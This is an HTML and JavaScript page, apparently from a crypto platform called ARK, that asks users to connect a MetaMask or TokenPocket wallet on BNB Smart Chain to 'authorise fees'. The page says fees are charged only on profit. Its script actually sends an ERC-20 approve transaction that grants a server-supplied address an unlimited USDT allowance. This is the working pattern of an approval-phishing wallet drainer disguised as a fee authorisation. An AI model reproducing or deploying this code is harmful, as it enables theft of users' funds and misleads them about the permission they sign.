<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>ARK - 授权盖茨费</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0a0e17;color:#e0e0e0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
.c{background:#161b22;border:1px solid #21262d;border-radius:20px;padding:36px 24px;width:100%;max-width:440px;text-align:center}
.c h2{color:#58a6ff;margin-bottom:8px;font-size:1.4em}
.sub{color:#8b949e;font-size:.85em;margin-bottom:24px;line-height:1.5}
.wallet-select{margin-bottom:20px}
.wallet-select .label{color:#8b949e;font-size:.85em;margin-bottom:12px}
.wallet-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.wallet-card{background:#0d1117;border:2px solid #21262d;border-radius:14px;padding:18px 12px;cursor:pointer;transition:all .2s;text-align:center}
.wallet-card:active{transform:scale(.97)}
.wallet-card.active{border-color:#238636;background:#0d2818}
.wallet-card .icon{width:48px;height:48px;margin:0 auto 8px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:28px}
.wallet-card .icon-fox{background:#f6851b20}
.wallet-card .icon-tp{background:#1e9eff20}
.wallet-card .name{font-weight:700;font-size:.9em}
.wallet-card .desc{color:#8b949e;font-size:.75em;margin-top:4px}
.wallet-card .check{width:20px;height:20px;border-radius:50%;background:#238636;color:#fff;display:none;align-items:center;justify-content:center;font-size:12px;margin:6px auto 0}
.wallet-card.active .check{display:flex}
.step{background:#0d1117;border:1px solid #21262d;border-radius:12px;padding:16px;margin-bottom:12px;text-align:left}
.step .num{display:inline-block;width:24px;height:24px;background:#238636;color:#fff;border-radius:50%;text-align:center;line-height:24px;font-size:.8em;font-weight:700;margin-right:8px}
.step .num.run{background:#1f6feb;animation:pulse 1s infinite}
.step .num.err{background:#da3633}
.step .num.done{background:#238636}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
.step .title{font-weight:600;font-size:.95em}
.step .desc{color:#8b949e;font-size:.8em;margin-top:4px}
.btn{width:100%;padding:14px;font-size:16px;font-weight:700;border:none;border-radius:10px;cursor:pointer;margin-top:8px}
.btn:active{opacity:.8;transform:scale(.98)}
.btn-bg{background:#238636;color:#fff}
.btn-blue{background:#1f6feb;color:#fff}
.btn:disabled{opacity:.5;cursor:not-allowed}
.msg{margin-top:14px;padding:12px;border-radius:8px;font-size:.9em;display:none;overflow:hidden;white-space:pre-line;text-align:left;line-height:1.5}
.msg.ok{display:block;background:#0d2818;color:#3fb950;border:1px solid #238636}
.msg.err{display:block;background:#2d1117;color:#f85149;border:1px solid #da3633}
.msg.info{display:block;background:#0d1117;color:#58a6ff;border:1px solid #1f6feb}
.addr{font-family:monospace;color:#d29922;font-size:.8em;word-break:break-all;margin-top:4px}
.bnb-info{color:#f0883e;font-size:.82em;margin-top:6px;text-align:left;padding:0 4px}
</style>
</head>
<body>
<div class="c">
  <h2>授权盖茨费</h2>
  <div class="sub">授权后系统可在盈利时自动从您的BSC钱包扣除盖茨费（服务费20% + 生态费10%）<br>无盈利不收费</div>

  <div class="wallet-select" id="walletSelect">
    <div class="label">选择您要使用的钱包</div>
    <div class="wallet-grid">
      <div class="wallet-card" id="cardMetaMask" onclick="selectWallet('metamask')">
        <div class="icon icon-fox">MM</div>
        <div class="name">MetaMask</div>
        <div class="desc">狐狸钱包浏览器插件</div>
        <div class="check">V</div>
      </div>
      <div class="wallet-card" id="cardTokenPocket" onclick="selectWallet('tokenpocket')">
        <div class="icon icon-tp">TP</div>
        <div class="name">TokenPocket</div>
        <div class="desc">TokenPocket 钱包 App</div>
        <div class="check">V</div>
      </div>
    </div>
  </div>

  <div id="steps" style="display:none">
    <div class="step" id="step1">
      <div><span class="num" id="n1">1</span><span class="title" id="step1Title">连接钱包</span></div>
      <div class="desc" id="step1Desc">连接您注册时使用的BSC钱包</div>
    </div>
    <div class="step" id="step2">
      <div><span class="num" id="n2">2</span><span class="title">授权 USDT</span></div>
      <div class="desc" id="step2Desc">点击下方按钮，在钱包中确认授权交易</div>
    </div>
    <div class="step" id="step3">
      <div><span class="num" id="n3">3</span><span class="title">完成</span></div>
      <div class="desc">授权成功后盖茨费系统自动激活</div>
    </div>
  </div>

  <button class="btn btn-blue" id="connectBtn" style="display:none" onclick="connectWallet()">连接钱包</button>
  <button class="btn btn-bg" id="approveBtn" style="display:none" onclick="approveUSDT()">授权 USDT</button>

  <div id="msg" class="msg"></div>
  <div id="bnbInfo" class="bnb-info" style="display:none"></div>

  <div id="info" style="margin-top:16px;font-size:.8em;color:#484f58;display:none">
    <div>Trader: <span class="addr" id="traderAddr">--</span></div>
    <div style="margin-top:4px">USDT: <span class="addr" id="usdtAddr">--</span></div>
    <div style="margin-top:4px">Wallet: <span class="addr" id="walletAddr">--</span></div>
  </div>

  <button class="btn" style="background:#21262d;color:#8b949e;margin-top:16px" onclick="location.href='index.html'">返回</button>
</div>

<script>
var token = localStorage.getItem('ark_token');
var traderAddress = '';
var usdtAddress = '';
var walletAddr = '';
var connected = false;
var selectedWallet = '';
var provider = null;
var connectedAddr = '';

function showMsg(text, type) {
  var m = document.getElementById('msg');
  m.textContent = text;
  m.className = 'msg ' + type;
}

function setStep(num, state) {
  var el = document.getElementById('n' + num);
  el.className = 'num ' + state;
  if (state === 'done') el.textContent = '\u2713';
}

function selectWallet(type) {
  selectedWallet = type;
  document.getElementById('cardMetaMask').classList.toggle('active', type === 'metamask');
  document.getElementById('cardTokenPocket').classList.toggle('active', type === 'tokenpocket');

  var connectBtn = document.getElementById('connectBtn');
  connectBtn.style.display = 'block';
  document.getElementById('steps').style.display = 'block';

  if (type === 'metamask') {
    connectBtn.textContent = '连接 MetaMask';
    document.getElementById('step1Title').textContent = '连接 MetaMask 钱包';
    document.getElementById('step2Desc').textContent = '点击下方按钮，在 MetaMask 中确认授权交易';
  } else {
    connectBtn.textContent = '连接 TokenPocket';
    document.getElementById('step1Title').textContent = '连接 TokenPocket';
    document.getElementById('step2Desc').textContent = '点击下方按钮，在 TokenPocket 中确认授权交易';
  }
  document.getElementById('msg').className = 'msg';
  document.getElementById('bnbInfo').style.display = 'none';
}

function getProvider() {
  if (selectedWallet === 'metamask') {
    if (window.ethereum && window.ethereum.isMetaMask) return window.ethereum;
    if (window.ethereum) return window.ethereum;
    return null;
  }
  if (selectedWallet === 'tokenpocket') {
    if (window.ethereum && window.ethereum.isTokenPocket) return window.ethereum;
    if (window.ethereum && window.ethereum.isTp) return window.ethereum;
    if (window.tokenpocket && typeof window.tokenpocket.request === 'function') return window.tokenpocket;
    if (window.tp && typeof window.tp.request === 'function') return window.tp;
    if (window.ethereum) return window.ethereum;
    return null;
  }
  return null;
}

async function loadParams() {
  if (!token) { showMsg('请先登录', 'err'); return false; }
  try {
    var resp = await fetch('/api/vault/approve-params', {
      headers: { 'Authorization': 'Bearer ' + token }
    });
    var data = await resp.json();
    if (!data.success) { showMsg(data.error || '获取参数失败', 'err'); return false; }
    traderAddress = data.traderAddress;
    usdtAddress = data.usdtAddress;
    walletAddr = data.bscWalletAddr;
    document.getElementById('traderAddr').textContent = traderAddress;
    document.getElementById('usdtAddr').textContent = usdtAddress;
    document.getElementById('walletAddr').textContent = walletAddr;
    document.getElementById('info').style.display = 'block';
    return true;
  } catch (e) {
    showMsg('网络错误: ' + e.message, 'err');
    return false;
  }
}

async function connectWallet() {
  if (!selectedWallet) { showMsg('请先选择钱包类型', 'err'); return; }
  provider = getProvider();

  if (!provider) {
    var msgEl = document.getElementById('msg');
    msgEl.className = 'msg err';
    if (selectedWallet === 'tokenpocket') {
      msgEl.innerHTML = '未检测到 TokenPocket 钱包\n\n请在 TokenPocket App 中打开此页面：\n1. 打开 TokenPocket App\n2. 点击底部「发现」\n3. 在搜索框粘贴当前网址\n4. 打开后点击「去授权」\n\n或选择 MetaMask 授权';
    } else {
      msgEl.innerHTML = '未检测到 MetaMask\n\n请安装 MetaMask 浏览器插件后刷新页面\n\n或选择 TokenPocket 授权';
    }
    msgEl.style.display = 'block';
    setStep(1, 'err');
    return;
  }

  try {
    var accounts = await provider.request({ method: 'eth_requestAccounts' });
    var addr = accounts[0];

    if (walletAddr && addr.toLowerCase() !== walletAddr.toLowerCase()) {
      showMsg('钱包地址不匹配！\n请连接注册时使用的钱包:\n' + walletAddr.slice(0,10) + '...' + walletAddr.slice(-6), 'err');
      setStep(1, 'err');
      return;
    }

    // Switch to BSC if not already
    var chainId = await provider.request({ method: 'eth_chainId' });
    if (chainId !== '0x38') {
      try {
        await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
      } catch (switchErr) {
        if (switchErr.code === 4902) {
          await provider.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: '0x38', chainName: 'BNB Smart Chain',
              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
              rpcUrls: ['https://bsc-rpc.publicnode.com'],
              blockExplorerUrls: ['https://bscscan.com']
            }]
          });
        }
      }
      // CRITICAL: Verify chain actually switched
      var newChainId = await provider.request({ method: 'eth_chainId' });
      if (newChainId !== '0x38') {
        showMsg('钱包未切换到 BSC 网络！\n\n请在钱包中手动切换到 BNB Smart Chain (Chain ID 56)，然后重新点击授权', 'err');
        setStep(1, 'err');
        return;
      }
    }

    connected = true;
    connectedAddr = addr;
    setStep(1, 'done');
    showMsg('钱包已连接: ' + addr.slice(0,8) + '...' + addr.slice(-4), 'ok');
    document.getElementById('connectBtn').style.display = 'none';
    document.getElementById('approveBtn').style.display = 'block';

    checkBnbBalance(addr);
  } catch (e) {
    showMsg('连接失败: ' + (e.message || '用户拒绝'), 'err');
    setStep(1, 'err');
  }
}

// Check BNB balance immediately after connecting
async function checkBnbBalance(addr) {
  try {
    var balHex = await provider.request({ method: 'eth_getBalance', params: [addr, 'latest'] });
    var balWei = BigInt(balHex);
    var balBnb = Number(balWei) / 1e18;
    var infoEl = document.getElementById('bnbInfo');
    if (balBnb < 0.0001) {
      infoEl.textContent = 'BNB 余额不足! 当前: ' + balBnb.toFixed(6) + ' BNB - 授权仅需0.00006 BNB gas费，请确保至少有0.0001 BNB';
      infoEl.style.color = '#f85149';
      infoEl.style.display = 'block';
    } else {
      infoEl.textContent = 'BNB 余额: ' + balBnb.toFixed(4) + ' BNB (足够支付 gas 费)';
      infoEl.style.color = '#3fb950';
      infoEl.style.display = 'block';
    }
  } catch (e) {}
}

async function approveUSDT() {
  if (!connected) { showMsg('请先连接钱包', 'err'); return; }
  setStep(2, 'run');
  document.getElementById('approveBtn').disabled = true;
  document.getElementById('msg').className = 'msg';
  document.getElementById('bnbInfo').style.display = 'none';

  try {
    // Use the address from connectWallet (already authorized)
    var from = connectedAddr;
    if (!from) {
      // Fallback: try eth_accounts (should not trigger popup)
      var accounts = await provider.request({ method: 'eth_accounts' });
      from = accounts[0];
    }
    if (!from) {
      showMsg('无法获取钱包地址，请重新连接钱包后重试', 'err');
      setStep(2, 'err');
      document.getElementById('approveBtn').disabled = false;
      return;
    }

    // CRITICAL: Verify we're on BSC before sending
    var currentChain = await provider.request({ method: 'eth_chainId' });
    if (currentChain !== '0x38') {
      // Try switching silently
      try {
        await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
      } catch(e) {}
      // Re-check
      currentChain = await provider.request({ method: 'eth_chainId' });
      if (currentChain !== '0x38') {
        showMsg('钱包不在 BSC 网络！\n\n请手动在钱包中切换到 BNB Smart Chain 后重试', 'err');
        setStep(2, 'err');
        document.getElementById('approveBtn').disabled = false;
        return;
      }
    }

    // Step 1: Check BNB balance
    var balHex = await provider.request({ method: 'eth_getBalance', params: [from, 'latest'] });
    var balWei = BigInt(balHex);
    var balBnb = Number(balWei) / 1e18;
    if (balBnb < 0.0001) {
      showMsg('BNB 余额不足！当前: ' + balBnb.toFixed(6) + ' BNB\n\n授权交易仅需约 0.00006 BNB（不到0.1元）作为 gas 费\n\n请确保钱包中至少有 0.0001 BNB', 'err');
      setStep(2, 'err');
      document.getElementById('approveBtn').disabled = false;
      return;
    }

    // Step 2: Build and send transaction (skip eth_call simulation - not reliable in TokenPocket)
    var spenderPadded = traderAddress.toLowerCase().replace('0x', '').padStart(64, '0');
    var maxAmount = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
    var data = '0x095ea7b3' + spenderPadded + maxAmount;

    // ONLY pass from, to, data — let the wallet handle gas/gasPrice/chainId
    // Passing extra params caused TokenPocket to send tx to wrong chain (stack underflow)
    var txParams = {
      from: from,
      to: usdtAddress,
      data: data
    };

    var walletLabel = selectedWallet === 'metamask' ? 'MetaMask' : 'TokenPocket';
    showMsg('请在 ' + walletLabel + ' 中确认授权交易...', 'info');

    var txHash = await provider.request({ method: 'eth_sendTransaction', params: [txParams] });
    showMsg('交易已发送，等待确认...\n' + txHash.slice(0,18) + '...', 'info');

    // Wait for receipt, max 3 minutes
    var receipt = null;
    for (var i = 0; i < 60; i++) {
      await new Promise(function(r) { setTimeout(r, 3000); });
      receipt = await provider.request({ method: 'eth_getTransactionReceipt', params: [txHash] });
      if (receipt) break;
    }

    if (!receipt) {
      showMsg('交易超时（3分钟未确认）\n\n请查看 BSCScan:\nhttps://bscscan.com/tx/' + txHash, 'err');
      setStep(2, 'err');
      document.getElementById('approveBtn').disabled = false;
      return;
    }

    if (receipt.status === '0x0' || receipt.status === 0) {
      // Tx mined but failed - try to get revert reason
      var reason = '';
      try {
        var txData = await provider.request({ method: 'eth_getTransactionByHash', params: [txHash] });
        await provider.request({ method: 'eth_call', params: [{ from: txData.from, to: txData.to, data: txData.input, gas: txData.gas }, 'latest'] });
      } catch (callErr) {
        reason = callErr.message || '';
        if (reason.includes('insufficient funds')) reason = 'BNB 余额不足以支付 gas 费';
        else if (reason.includes('execution reverted')) reason = '合约执行被拒绝（reverted）';
      }
      var errMsg = '交易失败！';
      if (reason) errMsg += '\n\n原因: ' + reason;
      errMsg += '\n\n解决方案：\n1. 确保钱包已切换到 BSC 主网\n2. 确保 BNB 余额大于 0.0001 BNB\n3. 可在交易所购买少量 BNB（约1元）转到此钱包';
      errMsg += '\n\nBSCScan: https://bscscan.com/tx/' + txHash;
      showMsg(errMsg, 'err');
      setStep(2, 'err');
      document.getElementById('approveBtn').disabled = false;
      return;
    }

    setStep(2, 'done');

    // Step 4: Notify backend to verify on-chain
    try {
      var confirmResp = await fetch('/api/vault/approve-confirmed', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
        body: JSON.stringify({ txHash: txHash })
      });
      var confirmData = await confirmResp.json();
      if (!confirmData.success) {
        showMsg('链上验证失败: ' + (confirmData.error || '未知错误') + '\n请稍后重试或联系管理员', 'err');
        setStep(3, 'err');
        document.getElementById('approveBtn').disabled = false;
        return;
      }
    } catch (e) {
      showMsg('网络错误: ' + e.message + '\n授权可能已成功，请刷新页面查看状态', 'err');
      setStep(3, 'err');
      return;
    }

    setStep(3, 'done');
    showMsg('授权成功！盖茨费系统已激活，3秒后返回...', 'ok');
    setTimeout(function() { location.href = 'index.html'; }, 3000);

  } catch (e) {
    var errMsg = '授权失败: ' + (e.message || '用户拒绝');
    if (e.message && e.message.includes('-32000')) {
      errMsg += '\n\n提示: 请确认钱包已切换到 BSC 网络';
    }
    showMsg(errMsg, 'err');
    setStep(2, 'err');
    document.getElementById('approveBtn').disabled = false;
  }
}

loadParams();
</script>
</body>
</html>
